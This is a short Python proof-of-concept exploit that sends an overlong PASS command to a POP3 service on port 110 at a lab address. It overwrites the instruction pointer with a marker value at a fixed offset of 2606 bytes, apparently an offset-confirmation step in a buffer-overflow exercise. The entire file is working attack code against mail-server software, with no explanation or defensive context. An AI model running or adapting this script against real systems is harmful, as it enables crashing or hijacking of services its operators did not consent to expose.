#!/usr/bin/python3

import socket
from time import sleep

# consts
IP = '192.168.56.102'
PORT = 110
MAX_BUFFER_SIZE = 2750
EIP_OFFSET = 2606

# POC - send 4 bytes to the EIP
buffer = EIP_OFFSET * b'A' + 4 * b'B' + (MAX_BUFFER_SIZE - EIP_OFFSET - 4) * b'C'

try:
    # Connect
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP, PORT))

    # Send Username
    welcome = s.recv(1024)
    username = b'USER Aviv' + b'\r\n'
    s.send(username)

    # Send Password
    greet_user = s.recv(1024)
    password = b'PASS ' + buffer +  b'\r\n'
    s.send(password)

    print('- Completed')

except Exception as e:
    print(e)
    exit()